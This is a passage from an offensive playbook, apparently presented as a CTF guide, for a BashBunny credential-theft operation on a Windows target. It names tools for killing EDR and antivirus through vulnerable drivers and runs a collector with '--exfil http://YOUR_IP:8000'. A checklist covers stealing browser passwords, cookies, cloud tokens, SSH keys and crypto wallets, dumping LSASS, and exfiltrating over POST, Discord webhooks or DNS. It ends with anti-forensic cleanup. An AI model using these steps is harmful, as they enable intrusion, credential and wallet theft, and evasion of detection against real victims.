#    (driver-specific — see PoC tools: KDMapper, EDRSandblast, Backstab)

# 4. Now SetWindowsHookEx / pynput runs undetected
python ctf_hunter.py --monitor --exfil http://YOUR_IP:8000

# 5. Unload and delete the driver
sc stop perfmon && sc delete perfmon
del C:\Windows\Temp\gpu_perf.sys
```

Reference tools for the kernel patching step:
- **EDRSandblast** — patches ETW and kernel callbacks using vulnerable driver
- **Backstab** — uses procexp.sys to kill protected AV processes
- **KDMapper** — maps unsigned drivers via iqvw64e.sys (Intel NIC driver)

These are well-documented public research tools, not something to implement from scratch.

---

## Checklist — on target

**Collection — automatic (ctf_hunter.py handles these)**
- [ ] Run ctf_hunter.py via BashBunny — collects all of the below automatically:
  - CredMan, AutoLogon, VNC, PuTTY, WinSCP, RDP, TeamViewer, MobaXterm
  - Config files, SSH keys, PS history, GPP, Unattend, Wi-Fi
  - Environment variables (user + system), Sticky Notes
  - FileZilla, Git credentials, Docker, kubectl
  - DPAPI credential blobs, package manager tokens (npm, pip, pypi, composer)
  - Thunderbird, browser passwords (Chrome/Edge/Brave/Opera/Vivaldi/Firefox)
  - Browser history, session cookies, OAuth tokens (Azure/AWS/GCloud/GitHub)
  - Recently opened files (shell:recent)
  - All major crypto wallets + browser extensions (MetaMask, Phantom, Coinbase, etc.)

**Collection — manual (not automated, do these on the target)**
- [ ] Check ADS on Desktop/Documents files (`Get-Item C:\Users\*\Desktop\* -Stream *`)
- [ ] Check named pipes (`[IO.Directory]::GetFiles("\\.\pipe\")`)
- [ ] Check Volume Shadow Copies for deleted files
- [ ] Check scheduled tasks (`Get-ScheduledTask | Where State -ne Disabled`)
- [ ] Dump LSASS if admin (parse offline with pypykatz)
- [ ] Wi-Fi password for enterprise networks (netsh won't show key, need different approach)

**Exfiltration — pick one based on network conditions**
- [ ] Direct POST (fast, needs open port): `--exfil http://YOUR_IP:8000`
- [ ] Upload to transfer.sh → notify your server with the URL
- [ ] Discord webhook upload (if HTTP to your server is blocked)
- [ ] DNS exfil (if all HTTP/S egress is filtered)

**Cleanup**
- [ ] Confirm exfil received before pulling BashBunny
- [ ] Verify `thumbs.db` is gone after successful exfil
- [ ] Timestomp INetCache folder if ADS file was not auto-deleted
- [ ] Clear PowerShell history if you ran any manual commands
